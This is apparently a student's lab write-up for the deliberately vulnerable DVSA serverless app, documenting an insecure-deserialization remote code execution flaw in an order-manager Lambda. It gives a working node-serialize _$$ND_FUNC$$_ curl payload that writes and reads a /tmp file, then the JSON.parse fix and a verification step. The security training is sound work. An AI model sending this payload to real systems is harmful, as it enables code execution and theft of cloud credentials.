# Lesson 1 — Event Injection (Insecure Deserialization)

**Student:** Ibrahim Alshayea  
**Vulnerability class:** Insecure Deserialization / Remote Code Execution  
**Affected component:** `DVSA-ORDER-MANAGER` Lambda — `order-manager.js`  
**Endpoint:** `POST /Stage/order`

---

## Summary

The `DVSA-ORDER-MANAGER` Lambda uses the `node-serialize` library to deserialize the
incoming request body on line 1 — before any authentication check. When `node-serialize`
encounters a string prefixed with `_$$ND_FUNC$$_`, it calls `eval()` on the content. If the
function body ends with `()`, it executes immediately as an IIFE.

An attacker who can reach the API Gateway endpoint (authenticated or not) can inject arbitrary
JavaScript that runs inside the Lambda environment with the function's IAM credentials.

**Impact:** Remote code execution, file system access (`/tmp`), exposure of temporary AWS
credentials, potential lateral movement.

---

## Root Cause

```js
// order-manager.js — VULNERABLE (line 1 of handler)
var req     = serialize.unserialize(event.body);    // eval() on user input
var headers = serialize.unserialize(event.headers);
```

`node-serialize` calls `eval()` on any value containing `_$$ND_FUNC$$_`. The handler calls
this on line 1, before any auth check, so even unauthenticated requests can exploit it.

---

## Reproduction Steps

### Prerequisites
- A running DVSA instance (see [docs/dvsa-setup.md](../../docs/dvsa-setup.md))
- A valid JWT (from the browser DevTools)

### Step 1 — Set environment variables
```bash
export API="https://<your-api-id>.execute-api.us-east-1.amazonaws.com/Stage/order"
export TOKEN="<your-cognito-jwt>"
```

### Step 2 — Send the malicious payload
```bash
bash exploit/exploit.sh
```

Or manually:
```bash
curl -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "authorization: $TOKEN" \
  -d '{
    "action": "_$$ND_FUNC$$_function(){
      var fs = require(\"fs\");
      fs.writeFileSync(\"/tmp/pwned.txt\", \"You are reading the contents of my hacked file!\");
      var fileData = fs.readFileSync(\"/tmp/pwned.txt\", \"utf-8\");
      console.error(\"FILE READ SUCCESS: \" + fileData);
    }()",
    "cart-id": ""
  }'
```

### Step 3 — Check CloudWatch
Go to **AWS Console → CloudWatch → Log groups → `/aws/lambda/DVSA-ORDER-MANAGER`**
and open the most recent log stream. Look for:

```
FILE READ SUCCESS: You are reading the contents of my hacked file!
```

The `Internal server error` HTTP response is expected — the injected code ran before the
handler crashed.



## Fix

**File:** `DVSA-ORDER-MANAGER / order-manager.js`

```js
// BEFORE (vulnerable)
var req     = serialize.unserialize(event.body);
var headers = serialize.unserialize(event.headers);

// AFTER (safe)
var req     = JSON.parse(event.body);
var headers = event.headers;
```

Additionally, add an allowlist check on the `action` field before the switch statement.

See [`fix/order-manager.patch`](fix/order-manager.patch) for the full diff.

### How to deploy the fix
1. Go to **AWS Console → Lambda → DVSA-ORDER-MANAGER → Code**.
2. Apply the changes shown in `fix/order-manager.patch`.
3. Click **Deploy**.

---

## Verification

Re-run the identical curl command. CloudWatch should show **no** `FILE READ SUCCESS` line.
A normal `action=orders` request should still return the user's order list correctly.

**Billed duration:** ~738 ms before fix · ~816 ms after fix (no functional difference).

---

## Takeaway

Never use a deserialization library that supports code evaluation on untrusted input.
`node-serialize` calls `eval()` by design — it is inherently unsafe for parsing user-controlled
data. Prefer `JSON.parse()` which only produces plain data and never evaluates code.
